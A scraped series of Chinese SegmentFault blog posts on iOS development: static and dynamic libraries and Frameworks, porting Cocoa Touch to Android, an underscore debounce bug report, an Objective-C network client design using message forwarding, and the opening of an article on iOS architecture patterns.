<h3>动态库</h3>
<p>动态库即动态链接库（Windows 下的 .dll，Linux 下的 .so，Mac 下的 .dylib）。与静态库相反，动态库在编译时并不会被拷贝到目标程序中，目标程序中只会存储指向动态库的引用。等到程序运行时，动态库才会被真正加载进来。</p>
<p>动态库的优点是，不需要拷贝到目标程序中，不会影响目标程序的体积，而且同一份库可以被多个程序使用（因为这个原因，动态库也被称作<strong>共享库</strong>）。同时，编译时才载入的特性，也可以让我们随时对库进行替换，而不需要重新编译代码。动态库带来的问题主要是，动态载入会带来一部分性能损失，使用动态库也会使得程序依赖于外部环境。如果环境缺少动态库或者库的版本不正确，就会导致程序无法运行（Linux 下喜闻乐见的 lib not found 错误）。</p>
<h2>iOS Framework</h2>
<p>除了上面提到的 .a 和 .dylib 之外，Mac OS/iOS 平台还可以使用 Framework。Framework 实际上是一种打包方式，将库的二进制文件，头文件和有关的资源文件打包到一起，方便管理和分发。</p>
<p>在 iOS 8 之前，iOS 平台不支持使用动态 Framework，开发者可以使用的 Framework 只有苹果自家的 UIKit.Framework，Foundation.Framework 等。这种限制可能是出于安全的考虑（见<a href=""https://stackoverflow.com/questions/4733847/can-you-build-dynamic-libraries-for-ios-and-load-them-at-runtime"" rel=""nofollow noreferrer"">这里的讨论</a>)。换一个角度讲，因为 iOS 应用都是运行在沙盒当中，不同的程序之间不能共享代码，同时动态下载代码又是被苹果明令禁止的，没办法发挥出动态库的优势，实际上动态库也就没有存在的必要了。</p>
<p>由于上面提到的限制，开发者想要在 iOS 平台共享代码，唯一的选择就是打包成静态库 .a 文件，同时附上头文件（例如<a href=""https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319164&amp;token=&amp;lang=zh_CN"" rel=""nofollow noreferrer"">微信的SDK</a>）。但是这样的打包方式不够方便，使用时也比较麻烦，大家还是希望共享代码都能能像 Framework 一样，直接扔到工程里就可以用。于是人们想出了各种奇技淫巧去让 Xcode Build 出 iOS 可以使用的 Framework，具体做法参考<a href=""https://github.com/kstenerud/iOS-Universal-Framework"" rel=""nofollow noreferrer"">这里</a>和<a href=""https://github.com/jverkoey/iOS-Framework"" rel=""nofollow noreferrer"">这里</a>，这种方法产生的 Framework 还有 “伪”(Fake) Framework 和 “真”(Real) Framework 的区别。</p>
<p>iOS 8/Xcode 6 推出之后，iOS 平台添加了动态库的支持，同时 Xcode 6 也原生自带了 Framework 支持（动态和静态都可以），上面提到的的奇技淫巧也就没有必要了（新的做法参考<a href=""http://www.cocoachina.com/ios/20141126/10322.html"" rel=""nofollow noreferrer"">这里</a>）。为什么 iOS 8 要添加动态库的支持？唯一的理由大概就是 Extension 的出现。Extension 和 App 是两个分开的可执行文件，同时需要共享代码，这种情况下动态库的支持就是必不可少的了。但是这种动态 Framework 和系统的 UIKit.Framework 还是有很大区别。系统的 Framework 不需要拷贝到目标程序中，我们自己做出来的 Framework 哪怕是动态的，最后也还是要拷贝到 App 中（App 和 Extension 的 Bundle 是共享的），因此苹果又把这种 Framework 称为 <a href=""https://developer.apple.com/library/prerelease/ios/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html"" rel=""nofollow noreferrer"">Embedded Framework</a>。</p>
<h2>Swift 支持</h2>
<p>跟着 iOS8 / Xcode 6 同时发布的还有 Swift。如果要在项目中使用外部的代码，可选的方式只有两种，一种是把代码拷贝到工程中，另一种是用动态 Framework。使用静态库是不支持的。</p>
<p>造成这个问题的原因主要是 Swift 的 Runtime 没有被包含在 iOS 系统中，而是会打包进 App 中（这也是造成 Swift App 体积大的原因），静态库会导致最终的目标程序中包含重复的 Runtime（这是<a href=""https://github.com/ksm/SwiftInFlux#static-libraries"" rel=""nofollow noreferrer"">苹果自家的解释</a>）。同时拷贝 Runtime 这种做法也会导致在纯 ObjC 的项目中使用 Swift 库出现问题。苹果声称等到 Swift 的 Runtime 稳定之后会被加入到系统当中，到时候这个限制就会被去除了（参考<a href=""https://stackoverflow.com/questions/25020783/how-to-distribute-swift-library-without-exposing-the-source-code"" rel=""nofollow noreferrer"">这个问题</a> 的问题描述，也是来自苹果自家文档）。</p>
<h2>CocoaPods 的做法</h2>
<p>在纯 ObjC 的项目中，CocoaPods 使用编译静态库 .a 方法将代码集成到项目中。在 Pods 项目中的每个 target 都对应这一个 Pod 的静态库。不过在编译过程中并不会真的产出 .a 文件。如果需要 .a 文件的话，可以参考<a href=""http://www.cnblogs.com/brycezhang/p/4117180.html"" rel=""nofollow noreferrer"">这里</a>，或者使用 <a href=""https://github.com/CocoaPods/cocoapods-packager"" rel=""nofollow noreferrer"">CocoasPods-Packager</a> 这个插件。</p>
<p>当不想发布代码的时候，也可以使用 Framework 发布 Pod，CocoaPods 提供了 <code>vendored_framework</code> 选项来使用第三方 Framework，具体的做法可以参考<a href=""http://www.telerik.com/blogs/how-to-use-a-third-party-framework-in-a-private-cocoapod"" rel=""nofollow noreferrer"">这里</a>和<a href=""https://stackoverflow.com/questions/18219286/podspec-link-binary-library"" rel=""nofollow noreferrer"">这里</a>。</p>
<p>对于 Swift 项目，CocoaPods 提供了动态 Framework 的支持，通过 <code>use_frameworks!</code> 选项控制。</p>
<p>更多有关代码分发的扩展资料可以参考这篇博客： <a href=""http://geeklu.com/2014/02/objc-lib/"" rel=""nofollow noreferrer"">http://geeklu.com/2014/02/objc-lib/</a></p>
<h4>参考资料</h4>
<ul>
<li><p><a href=""https://stackoverflow.com/questions/2649334/difference-between-static-and-shared-libraries"" rel=""nofollow noreferrer"">https://stackoverflow.com/questions/2649...</a></p></li>
<li><p><a href=""https://stackoverflow.com/questions/25080914/will-ios-8-support-dynamic-linking"" rel=""nofollow noreferrer"">https://stackoverflow.com/questions/2508...</a></p></li>
<li><p><a href=""https://stackoverflow.com/questions/6245761/difference-between-framework-and-static-library-in-xcode4-and-how-to-call-them"" rel=""nofollow noreferrer"">https://stackoverflow.com/questions/6245...</a></p></li>
<li><p><a href=""http://blog.cocoapods.org/CocoaPods-0.36/"" rel=""nofollow noreferrer"">http://blog.cocoapods.org/CocoaPods-0.36...</a></p></li>
</ul>

                ", iOS 静态库，动态库与 Framework,1531972045,270,1,682,1,1,https://segmentfault.com/a/1190000004920754
112,1,0,6,"
                    
<p>这是我最近一年在做的项目，用我们老大的话说，就是“能不能弄一个东西，让我的 iOS 程序一行代码不用改，却能运行在 Android 上”。为了这个目标，我们最后弄出了个这样的东西。</p>
<p>说起来我们之所以要做这个东西也是蛮有趣的。事情的起因，我们需要把一个为 iOS 写的排版引擎移植到 Android 上。但我们觉得这个排版引擎实在是太复杂了，而且把一个写好的 iOS 程序重新写个 Android 版本很无趣，那就变成了跟抄作业一样把 Objective-C 代码换成 Java 代码的行为了。</p>
<p>于是，为了移植这个排版引擎，我们面临两个选择：</p>
<ol>
<li><p>把排版引擎移植到 Android</p></li>
<li><p>把 iOS 移植到 Android，不改排版引擎，直接在 Android 上跑</p></li>
</ol>
<p>最终，我们选择了 2，于是我今后的一年（至今）就在搞这个东西了。</p>
<hr>
<p>谈谈我个人的体会吧。我参与到这个项目之后，就真正体会到了 iOS 的博大精深。我之前当然知道 iOS 一定有很多很多东西，但是当真正参与了这个项目，才发现 iOS 居然是如此的庞大。以至于它的一个小小的方面居然就包含了那么多东西。</p>
<p>我本人的工作主要是把 Cocoa Touch 层移植到 Android 上去。具体就是如图：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVuxKM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>把最上面那个青蓝色的方块移植到 Android 上去。顺便一提，iOS 的很多库是和 Mac 共用的。Apple 会用开源项目，Apple 自己闭源的东西会被别人开源。因此，如果是有历史的库，而且和 Mac 共用的库，一般都有开源项目可利用。但是 Cocoa Touch 层就比较坑爹，几乎没有可用的开源项目可直接使用。</p>
<p>于是，我本人的工作就是，手写 Cocoa Touch 层的代码，这个工作花了大概一年的时间。</p>
<p>某种意义上，我的任务性质有点像逆向推导出 Cocoa Touch 的内容。我需要查阅 Apple 的 API 文档，对文档的阅读要到细致到每个单词。然后给 h 文件填充实现，实现内容和 Apple 的程序员的实现越接近越好。但有一件事是 Apple 的程序员绝对不会做但我会做的，我还需要通过 JNI 调用 Android 的 API，并用 Java 编写一些功能让 Objective-C 使用。总之，至少在 Cocoa Touch 层这里，我要骗目标代码说它是在 iOS 上运行，而不能让它发现其实它是在 Android 上运行。</p>
<p>这个工作最麻烦的地方其实并不是在于“写出一个 Cocoa Touch 层”。光是写个 Cocoa Touch 是很简单的。难点在于，我手头能拿到的只有 Apple 的 API 文档以及和 h 文件。但是 API 文档给出的细节并不充足，这也可以理解，因为 API 文档是给开发 iOS 的开发者看的，可不是给我这种人看的。</p>
<p>因此，令人头疼的地方在于，针对具体实现，很多状态是隐藏的，也没有必要让 iOS 开发者知道这些状态，因此这些细节也绝对别想在 Apple 的 API 文档里找到。但是我必须知道这些细节，如果不知道这些细节，或者我自己写个实现有偏差的东西，到了 Android 上跑后会看到巨大的差异，而且这种差异极其难以定位。我这么说可能难以理解（恕我表达能力有限），总之就是“差之毫厘谬以千里”这样子。</p>
<p>这种定位的困难如果处理不当，对进度影响是很恶劣的。因为 bug 出现的地方可能和实际暴露的点之间隔了好多层呢。可能涉及到排版引擎的代码、各种开源项目的代码、我本人写的代码等。你要把 bug 和出问题的地方联系起来，不把整个项目拆了是做不到的。这种事情出一次，你也许得浪费 3、4 天时间来收拾。</p>
<p>而且更棘手的地方在于，如果你处理不好，这种现象可能每天都会冒出来。如果连续出个10几个，你就只能自杀了。幸运的是，我真的有认真考虑过这些可能性，并作了一些措施，结果，这一年里这种事情只出过几次。（但这几次就够呛了。）</p>
<p>这种问题经过我摸索，基本上靠两种方法解决。</p>
<p>第一，建立假设模型，然后实验。通过实验结果获取反馈，或者修改模型，或者证实模型。模型一旦证实，就可以开始码代码了。</p>
<p>第二，做实验可以获得大部分细节，但是某些太细节的东西做实验也没法活的。就只好先实现一个版本，然后假设它没有太大问题，等到之后证实有问题再改。</p>
<p>后一种情况比较坑爹，有些问题需要 3 个月才能暴露。将 3 个月后出现的问题与 3 个月之前写的代码联系起来是一件很头疼的事情。好在我 git 操作还算熟练。</p>
<p>对比起之前在另一家公司写业务逻辑代码的 Debug 过程，简直不要太轻松。有强大的 IDE，加上仅仅通过设置断点和打印日志就能发现 bug，简直太美好了。</p>
<hr>
<p>现在，我们的排版引擎已经能顺利在 Android 上运行了。</p>
<p>你能想象，你用 MacBook 接上一台 Android 平板和一台 iPad，然后在 Xcode 按一个按钮，你的 Android 平板和 iPad 会同时打开一个相同的 App。目前我们就能达到这种程度。</p>
<p>不过很遗憾的是，我们的团队恐怕过几个月后就要解散了。虽然这个项目还有很多工作可以继续做，但是我们的团队恐怕不会继续做它了。以后可能会把它开源吧。</p>
<p>顺便为推销一下我自己：</p>
<p>本人 2014 年毕业，快 2 年工作经验，过去 1 年远程工作经验</p>
<p>优先考虑远程工作</p>
<p>我的邮箱：xiangtantaozeyu@icloud.com</p>
<p>微信号：xiangtan_tao</p>

                ", 我们把 iOS 的 Cocoa Touch 移植到了 Android ,1531972047,328,1,352,1,1,https://segmentfault.com/a/1190000004857254
113,1,0,6,"
                    
<h1>事情是如何发生的</h1>
<p>最近干了件事情，发现了 underscore 源码的一个 bug。这件事本身并没有什么可说的，但是过程值得我们深思，记录如下，各位看官仁者见仁智者见智。</p>
<p>平时有浏览别人文章的习惯，看到一篇关于 ""函数节流"" 的文章（具体是哪篇就不说了），不过很遗憾作者似乎并没有搞清楚 throttle 和 debounce 的区别（或许根本不知道 debounce)。于是随手 Google 了一下，发现大多数谈 ""函数节流"" 的文章都会引用《高程三》中的经典代码：</p>
<p><span class=""img-wrap""><img data-src=""http://images2015.cnblogs.com/blog/675542/201603/675542-20160326150241120-393738911.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>代码本身并没有问题，但是很可惜，函数名有问题，应该叫 debounce 而非 throttle，这就引发了我的思考，这个错误的概念，这段错误的代码，为什么能够 ""流芳百世""？</p>
<h1>throttle vs debounce</h1>
<p>由于篇幅以及主题的关系，本文并不会讲 throttle 和 debounce 的具体用法以及区别等。（对此有兴趣的朋友可以跟帖，人数多的话楼主会另开一文）</p>
<p>有些人可能会说，凭什么你以为的 throttle 就是 throttle，debounce 就是 debounce？这就要聊聊我对于 ""理解某一个概念"" 的方法。</p>
<p>就以 throttle 为例，某日，老师给你布置了一个作业，让你深入理解一下 throttle，第二天上课来聊聊。张三心里非常高兴，这个概念在经典书籍《JavaScript高级程序设计》中见过，打开一看，就两页，而且解释地非常清晰，看完就高兴地干别的事情去了。而李四，觉得高程三讲的有点少，而去谷歌了下其他关于 throttle 的知识点，兴奋地看到 throttle 函数的好几种写法，发现高程三只是用了最简单的方式，还有更优雅运用场景更多的写法，或许此时他已经发现和 throttle 同时出现的还有个 debounce，这是什么鬼？反正老师没说，以后再看吧，于是心满意足地玩游戏去了。而王五，和李四一样发现了 debounce，这是什么？一起了解了吧，继而发现 debounce 的用法居然和高程三中的 throttle 一样！继续挖下去，发现高程三中的 throttle 函数其实应该叫 debounce，看到最后，王五已经把 throttle 和 debounce 彻底理解了。</p>
<p>我们要做王五。</p>
<p>首先，我们并不能只听一家之言。这里的一家是指 ""个人""，对于一些官方的文档我们还是应该充分信任的。泽卡斯也是人，犯点小错在所难免。</p>
<p>其次，我们对信息要做充分删选。网上的信息大多鱼龙混杂，出错了也并不会对你负任何责任。那么如何能够辨别出正确有用的信息呢？首先当然是看官方文档，比如说要了解 HTTP 那么就去看官方的 RFC，要学习 jQuery 的话可以去官网 <a href=""https://jquery.org/"" rel=""nofollow noreferrer"">https://jquery.org/</a> 查查资料，这些一般都不会有什么问题。如果觉得官网资料晦涩难懂，可以试着去看看 Wikipedia 或者XX百科，维基的精确度被很多人喷过，楼主觉得还是值得一看的，如果看英文比较吃力的，就看看国内的一些百科。第三，就是浏览一些前人的文章了，这也是最普遍但是也最容易混淆概念的地方，所以我们要尽量挑一些权威的专家级作者（比如楼主，开玩笑啦^_^）。第四，如果还是觉得没法理解，可以试着去一些问答社区，首推 stackoverflow，国内的话可以看看 segmentfault，知乎，看赞同多的回答，一般来说问题不大。</p>
<p>楼主找到的关于 throttle 和 debounce 区别的资料如下：</p>
<ul>
<li><p><a href=""http://benalman.com/projects/jquery-throttle-debounce-plugin/"" rel=""nofollow noreferrer"">http://benalman.com/projects/jquery-throttle-debounce-plugin/</a></p></li>
<li><p><a href=""https://davidwalsh.name/javascript-debounce-function"" rel=""nofollow noreferrer"">https://davidwalsh.name/javascript-debounce-function</a></p></li>
<li><p><a href=""https://css-tricks.com/the-difference-between-throttling-and-debouncing/"" rel=""nofollow noreferrer"">https://css-tricks.com/the-difference-between-throttling-and-debouncing/</a></p></li>
<li><p><a href=""https://ict.ken.be/javascript-debounce-vs-throttle-function"" rel=""nofollow noreferrer"">https://ict.ken.be/javascript-debounce-vs-throttle-function</a></p></li>
<li><p><a href=""http://stackoverflow.com/questions/25991367/difference-between-throttling-and-debouncing-a-function"" rel=""nofollow noreferrer"">http://stackoverflow.com/questions/25991367/difference-between-throttling-and-debouncing-a-function</a></p></li>
</ul>
<h1>关于拿来主义</h1>
<p>为什么这么多文章里会出现泽卡斯的错误代码？楼主想到了一个词，叫做 ""拿来主义""。</p>
<p>很多人写博客，只是为了写博客而写博客，随便谷歌百度下，找到搜索页前几个链接，东拼西凑下，一篇新鲜的博文就诞生了，甚至都没有自己写 demo 测试下，就把代码粘贴上去了，楼主对这样的行为是嗤之以鼻的。以前写过一篇文章，叫做 <a href=""http://www.cnblogs.com/zichi/p/5229108.html"" rel=""nofollow noreferrer"">get与post需要注意的几点</a>，写这篇文章的时候，看到过一篇叫做 <a href=""http://www.cnblogs.com/nankezhishi/archive/2012/06/09/getandpost.html"" rel=""nofollow noreferrer"">GET和POST有什么区别？及为什么网上的多数答案都是错的。</a> 的文章，就深刻抨击了 ""拿来主义"" 这一现象。很多知名的博主写过文章来遍历写博客的好处，于是大家都纷纷效仿，为了写博客而写博客。对于楼主来说，写博客是一种享受，通常写一篇类似本文的博文需要花费 2~4 个小时，却也乐此不疲，用心写过博文的人都知道，写一篇好的文章，需要花费大量的时间，而楼主身为一个完美主义者，每次写完一篇文章，至少自己已经读过十几遍了，写完之后还要读个两三遍才敢发表，所以很少有错别字以及不通顺的句子，但是 ""拿来主义"" 者则不然，简单地拼接一些资料，就能生产一篇博文，在此，楼主呼吁大家，如果写，请用心。</p>
<h1>the bug of underscore</h1>
<p>很多谈论 throttle 和 debounce 的文章，最后都会谈到 underscore 已经将这两个方法完美封装，有的给个 underscore 的链接，有的直接上段代码，很少有去深入看看它的实现的。楼主简单地用了下 underscore 封装的 debounce 方法，发现了 bug，建了个 issue <a href=""https://github.com/jashkenas/underscore/issues/2478"" rel=""nofollow noreferrer"">https://github.com/jashkenas/underscore/issues/2478</a>。</p>
<p>好几个外国人表示并没有重现我的 bug，最后我直接指出了代码的错误之处，并给出了自己的 fix 方案(详见 <a href=""https://github.com/jashkenas/underscore/pull/2479"" rel=""nofollow noreferrer"">https://github.com/jashkenas/underscore/pull/2479</a>），老外才认识到了代码中的 bug，并进行了修复（虽然最后没有采纳我的代码）。详细的过程可以看上面的两个链接里的内容，主要是和 underscorejs 两个维护者之间的交流，最后从他们的更新来看应该是 test cases 写错了。</p>
<h1>总结</h1>
<p>最后，楼主总结两点：</p>
<ul>
<li><p>对于知识点，请尽量查阅各种靠谱的资料，将其弄懂，不要一知半解</p></li>
<li><p>对于写博客，请弄懂了再写，不能误人子弟；如果写，请用心</p></li>
</ul>
<p><strong>最后的最后，希望大家能在 <a href=""https://github.com/hanzichi"" rel=""nofollow noreferrer"">Github</a> 上关注我</strong>，或者关注我的项目，我觉得 followers 多的话，也不会在发现 bug 的时候被维护者如此忽视了 ╮(╯▽╰)╭</p>
<p>Github：<a href=""https://github.com/hanzichi"" rel=""nofollow noreferrer"">https://github.com/hanzichi</a> 或者直接点击页面右上角，谢谢关注！</p>

                ", 一次发现underscore源码bug的经历以及对学术界拿来主义的思考,1531972049,456,1,524,1,1,https://segmentfault.com/a/1190000004707196
114,1,0,6,"
                    
<p>我们的客户端网络框架至少要解决三个问题：实现通信协议、账户系统、简化服务端接口调用。</p>
<p><strong>实现通信协议</strong> 根据与服务端制定的通信协议，实现请求的组装，序列化，发送，以及响应的接收和解析等。<br><strong>账户系统</strong> 简而言之就是实现注册、登陆、注销等功能，并维护登陆状态等。<br><strong>简化服务端接口调用</strong> 客户代码只需要提供业务参数和回调函数就可以实现与服务器通信，网络框架负责封装掉其余所有细节。</p>
<p>我想对架构比较敏感的读者会立刻有这样的共鸣，首先上述的账户系统显然是一个独立的模块，最好单独设计实现。另一方面，账户系统的功能又是以服务端接口调用为基础的，在形式上登陆操作也是调用服务端接口，那么把登陆相关操作与其他服务端接口调用实现于一处就是自然的。如果再作一些考虑，我们还会想到的一个问题是，网络框架暴露给客户代码的接口应当尽可能单一，如果我们用一个类维护账户系统，用另一个类做服务端业务接口调用，会嫌不够简洁。达成这几点共识之后，我们就可以继续探讨一些设计细节了。先看下面的代码。</p>
<pre><code>//SFClient.h
@interface SFClient

@property (nonatomic,readonly) NSString* account;
@property (nonatomic,readonly) NSString* password;
@property (nonatomic,readonly) BOOL isLoggedIn;
@property (nonatomic,readonly) BOOL pendingLogin;
@property (nonatomic,readonly) NSString* sessionId;

-(NSURLSessionTask*)loginWithAccount:(NSString*)account password:(NSString*)password;

-(NSURLSessionTask*)logout;

-(NSURLSessionTask*)someNetworkingTaskWithCompletionHandler:(SFNetworkingTaskCompletionHandler)completionHandler;

//...

@end</code></pre>
<pre><code>有的同行习惯于为每一个后端接口单独开一个类，这当然也不失为一种设计风格，笔者也曾尝试过，个人感觉嫌繁。
</code></pre>
<p>这里的SFClient类作为账户系统，又兼具服务端业务接口调用功能，实现了使接口尽可能简洁的设计目标，却违背了账户系统应当单独实现的架构设计直觉。<br>如何解决这一矛盾呢？可以采用dynamic <a href=""https://sourcemaking.com/design_patterns/proxy"" rel=""nofollow noreferrer"">proxy</a>设计模式。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVtTEO"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>定义一个<code>protocol</code>假设叫<code>SFBackendInterfaces</code>，和一个实现类假设叫<code>SFBackendInterfacesImpl</code>。让<code>SFClient</code>和<code>SFBackendInterfacesImpl</code>都实现这个协议。</p>
<pre><code>@protocol SFBackendInterfaces&lt;NSObject&gt;

-(NSURLSessionTask*)loginWithAccount:(NSString*)account password:(NSString*)password completionHandler:(SFNetworkingTaskCompletionHandler);

-(NSURLSessionTask*)someNetworkingTaskWithCompletionHandler:(SFNetworkingTaskCompletionHandler)completionHandler;

@end

@interface SFClient:NSObject&lt;SFBackendInterfaces&gt;

@interface SFBackendInterfacesImpl:NSObject&lt;SFBackendInterfaces&gt;
</code></pre>
<p>这样做的目的是什么呢，就是让SFClient类继续提供服务端接口调用功能，同时把这些接口调用的实现代码交给SFBackendInterfacesImpl。这样就既满足网络框架接口简洁的需求，又保持了SFClient类作为账户系统的纯净，<code>-(NSURLSessionTask*)someNetworkingTaskWithCompletionHandler:(SFNetworkingTaskCompletionHandler)completionHandler;</code>这行代码可以从SFClient的interface中拿掉了，并且相关代码也不需要出现在它的implementation文件里了。我们来看implementation。</p>
<pre><code>@implementation SFClient

-(void)forwardInvocation:(NSInvocation *)anInvocation
{
    if([self.backendInterfacesImpl respondsToSelector:anInvocation.selector]){
        [anInvocation invokeWithTarget:self.backendInterfacesImpl];
    }else{
        [super forwardInvocation:anInvocation];
    }
}

-(void)loginWithAccount:(NSString*)account password:(NSString*)password
{
    NSURLSessionTask* task=[self loginWithAccount:account password:(NSString*)password completionHandler:^(SFResponse* response){
        [[NSNotificationCenter defaultCenter] postNotificationNamed:SFLoginCompletionNotification object:response];
        _pendingLogin=NO;
        if(response.status==SFResponseStatusSuccess){
            _loggedIn=YES;
        }
    }];
    [task resume];
    _pendingLogin=YES;
}

@end

@implementation SFBackendInterfacesImpl

-(NSURLSessionTask*)loginWithAccount:(NSString*)account password:(NSString*)password completionHandler:(SFNetworkingTaskCompletionHandler)
{
    //...
}

-(NSURLSessionTask*)someNetworkingTaskWithCompletionHandler:(SFNetworkingTaskCompletionHandler)completionHandler
{
    //...
}

@end
</code></pre>
<p>这样客户代码就可以通过SFClient这一单一接口使用网络框架了。</p>
<pre><code>
[[SFClient sharedClient] loginWithAccount:xxxx password:xxxx];
//...
NSURLSessionTask* task=[[SFClient sharedClient] someNetworkingTaskWithPara::param completionHandler:^(SFResponse* response){
    //...
}];
[task resume];
</code></pre>
<p>而在框架内部实现上，账户系统和业务接口调用的实现仍然是分离的。</p>

                ", iOS客户端网络框架设计（一）,1531972050,525,1,900,1,1,https://segmentfault.com/a/1190000004694334
115,1,0,6,"
                    
<p>原文地址：<a href=""https://blog.coding.net/blog/ios-architecture-patterns"" rel=""nofollow noreferrer"">https://blog.coding.net/blog/ios-architecture-patterns</a></p>
<blockquote>
<p><em>Make everything as simple as possible, but not simpler — Albert Einstein</em></p>
<p><em>把每件事，做简单到极致，但又不过于简单 - 阿尔伯特·爱因斯坦</em></p>
</blockquote>
<p>在使用 iOS 的 MVC 时候感觉怪怪的？想要尝试下 MVVM？之前听说过 VIPER，但是又纠结是不是值得去学？</p>
<p>继续阅读，你就会知道上面问题的答案 - 如果读完了还是不知道的话，欢迎留言评论。</p>
<p>iOS 上面的架构模式你可能之前就了解过一些，接下来我们会帮你把它们进行一下梳理。我们先简要回顾一下目前比较主流的架构模式，分析比较一些他们的原理，并用一些小栗子来进行练习。如果你对其中的某一种比较感兴趣的话，我们也在文章里面给出了对应的链接。</p>
<p><em>对于设计模式的学习是一件容易上瘾的事情，所以先提醒你一下：在你读完这篇文章之后，可能会比读之前有更多的疑问，比如：</em></p>
<p><em>（MVC）谁来负责网络请求：是 Model 还是 Controller？</em><br><em>（MVVM）我该怎么去把一个 Model 传递给一个新创建的 View 的 ViewModel？</em><br><em>（VIPER）谁来负责创建 VIPER 模块：是 Router 还是 Presenter？</em></p>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*79nWxPpKgL7JGjYp0HrT6A.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""..."" title=""...""></span></p>
<h3>为何要在意架构的选择呢？</h3>
<p>因为如果你不在意的话，难保一天，你就需要去调试一个巨大无比又有着各种问题的类，然后你会发现在这个类里面，你完全就找不到也修复不了任何 bug。一般来说，把这么大的一个类作为整体放在脑子里记着是一件非常困难的事情，你总是难免会忘掉一些比较重要的细节。如果你发现在你的应用里面已经开始出现这种状况了，那你很可能遇到过下面这类问题：</p>
<ul>
<li><p>这个类是一个 UIViewController 的子类。</p></li>
<li><p>你的数据直接保存在了 UIViewController 里面。</p></li>
<li><p>你的 UIViews 好像什么都没做。</p></li>
<li><p>你的 Model 只是一个纯粹的数据结构</p></li>
<li><p>你的单元测试什么都没有覆盖到</p></li>
</ul>
<p>其实即便你遵循了 Apple 的设计规范，实现了 <a href=""https://developer.apple.com/library/ios/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html"" rel=""nofollow noreferrer"">Apple 的 MVC 框架</a>，也还是一样会遇到上面这些问题；所以也没什么好失落的。<a href=""https://developer.apple.com/library/ios/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html"" rel=""nofollow noreferrer"">Apple 的 MVC 框架</a> 有它自身的缺陷，不过这个我们后面再说。</p>
<p>让我们先来定义一下好的框架应该具有的特征：</p>
<ol>
<li><p>用严格定义的角色，平衡的将职责 <strong>划分</strong> 给不同的实体。</p></li>
<li><p><strong>可测性</strong> 通常取决于上面说的第一点（不用太担心，如果架构何时的话，做到这点并不难）。</p></li>
<li><p><strong>易用</strong> 并且维护成本低。</p></li>
</ol>
<h5>为什么要划分？</h5>
<p>当我们试图去理解事物的工作原理的时候，划分可以减轻我们的脑部压力。如果你觉得开发的越多，大脑就越能适应去处理复杂的工作，确实是这样。但是大脑的这种能力不是线性提高的，而且很快就会达到一个瓶颈。所以要处理复杂的事情，最好的办法还是在遵循 <a href=""https://en.wikipedia.org/wiki/Single_responsibility_principle"" rel=""nofollow noreferrer"">单一责任原则</a> 的条件下，将它的职责划分到多个实体中去。</p>
<h5>为什么要可测性？</h5>
<p>对于那些对单元测试心存感激的人来说，应该不会有这方面的疑问：单元测试帮助他们测试出了新功能里面的错误，或者是帮他们找出了重构的一个复杂类里面的 bug。这意味着这些单元测试帮助这些开发者们在程序运行之前就发现了问题，这些问题如果被忽视的话很可能会提交到用户的设备上去；而修复这些问题，又至少需要<a href=""http://appreviewtimes.com/"" rel=""nofollow noreferrer"">一周左右的时间</a>（AppStore 审核）。</p>
<h5>为什么要易用</h5>
<p>这块没什么好说的，直说一点：最好的代码是那些从未被写出来的代码。代码写的越少，问题就越少；所以开发者想少写点代码并不一定就是因为他懒。还有，当你想用一个比较 <em>聪明</em> 的方法的时候，全完不要忽略了它的维护成本。</p>
<h3>MV(X) 的基本要素</h3>
<p>现在我们面对架构设计模式的时候有了很多选择：</p>
<ul>
<li><p><a href=""https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller"" rel=""nofollow noreferrer"">MVC</a></p></li>
<li><p><a href=""https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93presenter"" rel=""nofollow noreferrer"">MVP</a></p></li>
<li><p><a href=""https://en.wikipedia.org/wiki/Model_View_ViewModel"" rel=""nofollow noreferrer"">MVVM</a></p></li>
<li><p><a href=""https://www.objc.io/issues/13-architecture/viper/"" rel=""nofollow noreferrer"">VIPER</a></p></li>
</ul>
<p>首先前三种模式都是把所有的实体归类到了下面三种分类中的一种：</p>
<ul>
<li><p><strong>Models（模型）</strong> — 数据层，或者负责处理数据的 <a href=""https://en.wikipedia.org/wiki/Data_access_layer"" rel=""nofollow noreferrer"">数据接口层</a>。比如 <em>Person</em> 和 <em>PersonDataProvider</em> 类</p></li>
<li><p><strong>Views（视图）</strong> - 展示层(GUI)。对于 iOS 来说所有以 <em>UI</em> 开头的类基本都属于这层。</p></li>
<li><p><strong>Controller/Presenter/ViewModel（控制器/展示器/视图模型）</strong> - 它是 <em>Model</em> 和 <em>View</em> 之间的胶水或者说是中间人。一般来说，当用户对 <em>View</em> 有操作时它负责去修改相应 <em>Model</em>；当 <em>Model</em> 的值发生变化时它负责去更新对应 <em>View</em>。</p></li>
</ul>
<p>将实体进行分类之后我们可以：</p>
<ul>
<li><p>更好的理解</p></li>
<li><p>重用（主要是 View 和 Model）</p></li>
<li><p>对它们独立的进行测试</p></li>
</ul>
<p>让我从 <em>MV(X)</em> 系列开始讲起，最后讲 <em>VIPER</em>。</p>
<h3>MVC - 它原来的样子</h3>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1200/1*E9A5fOrSr0yVmc7Kly5C6A.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""传统的 MVC"" title=""传统的 MVC""></span></p>
<p>在开始讨论 Apple 的 MVC 之前，我们先来看下 <a href=""https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller"" rel=""nofollow noreferrer"">传统的 MVC</a>。</p>
